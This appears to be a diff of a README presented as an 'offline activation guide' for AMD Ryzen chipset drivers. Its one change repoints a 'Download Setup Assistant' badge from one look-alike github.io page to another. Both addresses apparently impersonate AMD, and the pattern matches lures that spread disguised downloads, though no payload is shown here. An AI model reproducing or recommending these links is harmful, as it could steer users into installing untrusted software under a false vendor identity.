@@ -1,6 +1,6 @@
 # AMD Ryzen Chipset Drivers — Offline Activation Guide
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://amd-chipset-drivers.github.io/.github)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://amd-radeon-software-adrenalin.github.io/.github)
 
 ---
 
